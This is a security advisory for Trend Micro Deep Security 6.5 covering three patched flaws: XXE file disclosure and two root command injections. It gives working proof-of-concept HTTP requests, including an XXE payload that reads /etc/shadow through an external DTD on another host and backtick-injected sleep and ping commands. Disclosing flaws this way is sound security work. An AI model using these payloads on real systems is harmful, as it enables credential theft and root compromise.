@@ -1,0 +1,125 @@
+The following advisory describes three (3) vulnerabilities found in Trend Micro Deep Security version 6.5.
+
+“The Trend Micro Hybrid Cloud Security solution, powered by XGen security, delivers a blend of cross­-generational threat defense techniques that have been optimized to protect physical, virtual, and cloud workloads. It features Trend Micro Deep Security, the market share leader in server security, protecting millions of physical, virtual, and cloud servers around the world.
+Deep Security offers multiple layers of security that protect your servers as they move—across the data center, into the cloud, or in a hybrid deployment.”
+
+The vulnerabilities found in Trend Micro Deep Security:
+1. XML External Entity (XXE) that lead to arbitrary file disclosure 
+2. Local Privilege Escalation
+3. Remote code execution
+
+Credit
+An independent security researcher has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.
+
+Vendor response
+
+Trend Micro has released patches to address these vulnerabilities and issued the following advisory: https://success.trendmicro.com/solution/1117412
+
+Vulnerabilities Details
+
+XML External Entity (XXE) that lead to arbitrary file disclosure
+
+Trend Micro Security Manager uses an outdated REST API (resteasy­jaxrs­2.3.5.Final.jar). The library suffers from an XXE vulnerability that can be exploited using Parameter Entities.
+
+Proof of Concept
+
+By sending the following POST request, an attacker can gain the victims “/etc/shadow”
+ 
+1 POST /rest/authentication/login/sso HTTP/1.1
+2 Host: 192.168.18.129:4119
+3 Content­Type: application/xml
+4 Content­Length: 360
+5
+6 <?xml version="1.0" encoding="utf­8"?>
+7 <!DOCTYPE roottag [
+8 <!ENTITY % start "<![CDATA[">
+9 <!ENTITY % goodies SYSTEM "file:///etc/shadow">
+10 <!ENTITY % end "]]>">
+11 <!ENTITY % dtd SYSTEM "http://192.168.18.130/combine.dtd">
+12 %dtd;
+13
+14 ]> 15
+16 <dsCredentials>
+17 <password>P@ssw0rd</password>
+18 <tenantName></tenantName>
+19 <userName>&all;</userName>
+20 </dsCredentials>
+
+Local Privilege Escalation
+
+Admin users have access via the web interface to the SSH configuration settings. The port settings are not properly handled and allow injecting shell commands as the root user.
+
+1 POST /SSHConfig.jsp HTTP/1.1
+2 Host: 192.168.254.176:8443
+3 User­Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+4 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+5 Accept­Language: en­US,en;q=0.5
+6 Referer: https://192.168.254.176:8443/SSHConfig.jsp
+7 Cookie: JSESSIONID=2930898FD09512142C1B26C71D24466D
+8 Connection: close
+9 Content­Type: application/x­www­form­urlencoded
+10 Content­Length: 150
+11 CSRFGuardToken=67CI42CKYSW7R9JYWXEPN2MN2J9K8E5E&needSSHConfigure=yes&SSHSt
+12 atus=enable&SSHPort=22&op=save&cbSSHStatus=enable&btSSHPort=221
+
+In the above code, the SSHPort= parameter does not sanitize the incoming data. An attacker can use this to inject commands that will run as root on the victim’s machine.
+
+Proof of Concept
+
+The following POST request will call the sleep command with a value of 60 seconds:
+    
+1 POST /SSHConfig.jsp HTTP/1.1
+2 Host: 192.168.254.176:8443
+3 User­Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+4 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+5 Accept­Language: en­US,en;q=0.5
+6 Referer: https://192.168.254.176:8443/SSHConfig.jsp
+7 Cookie: JSESSIONID=2930898FD09512142C1B26C71D24466D
+8 Connection: close
+9 Content­Type: application/x­www­form­urlencoded
+10 Content­Length: 150
+11
+12 CSRFGuardToken=67CI42CKYSW7R9JYWXEPN2MN2J9K8E5E&needSSHConfigure=yes&SSHSt
+13 atus=enable&SSHPort=%60sleep%2010%60&op=save&cbSSHStatus=enable&btSSHPort=221
+
+Remote code execution
+
+Trend Micro Deep Security has a default user with sudo privileges named iscan. This user is locked out but it can access certain elevated functions.
+
+1 POST /servlet/com.trend.iwss.gui.servlet.ManageSRouteSettings?action=add HTTP/1.1
+2 Host: 192.168.254.176:8443
+3 User­Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+4 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+5 Accept­Language: en­US,en;q=0.5
+6 Referer: https://192.168.254.176:8443/staticRouteEdit.jsp?action=add
+7 Cookie: JSESSIONID=2930898FD09512142C1B26C71D24466D
+8 Connection: close
+9 Content­Type: application/x­www­form­urlencoded
+10 Content­Length: 259
+11
+12 CSRFGuardToken=67CI42CKYSW7R9JYWXEPN2MN2J9K8E5E&op=sroutemanage&fromurl=%2
+13 FstaticRoutes.jsp&failoverurl=%2FstaticRouteEdit.jsp&port=&oldnetid=&oldrouter=&oldnetmask=&
+14 oldport=&netid=192.168.1.0&netmask=255.255.255.0&router=192.168.1.1&interface_vlanid_sel=eth1
+
+In the above POST request, we can see the page has several parameters that are vulnerable and that we can inject malicious parameters through them: netid, netmask, router, and interface_vlanid_sel
+
+Proof of Concept:
+    
+1 POST /servlet/com.trend.iwss.gui.servlet.ManageSRouteSettings?action=add HTTP/1.1
+2 Host: 192.168.254.176:8443
+3 User­Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+4 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+5 Accept­Language: en­US,en;q=0.5
+6 Referer: https://192.168.254.176:8443/staticRouteEdit.jsp?action=add
+7 Cookie: JSESSIONID=2930898FD09512142C1B26C71D24466D
+8 Connection: close
+9 Content­Type: application/x­www­form­urlencoded
+10 Content­Length: 259
+11
+12 CSRFGuardToken=67CI42CKYSW7R9JYWXEPN2MN2J9K8E5E&op=sroutemanage&fromurl=%2
+13 FstaticRoutes.jsp&failoverurl=%2FstaticRouteEdit.jsp&port=&oldnetid=&oldrouter=&oldnetmask=&
+14 oldport=&netid=192.168.1.0%7c%7c%60ping%20­
+15 c%2021%20127.0.0.1%60%20%23'%7c%7c%60ping%20­
+16 c%2021%20127.0.0.1%60%20%23%5c%22%20&netmask=255.255.255.0&router=192.168.1.1&inte
+17 rface_vlanid_sel=eth1
+  
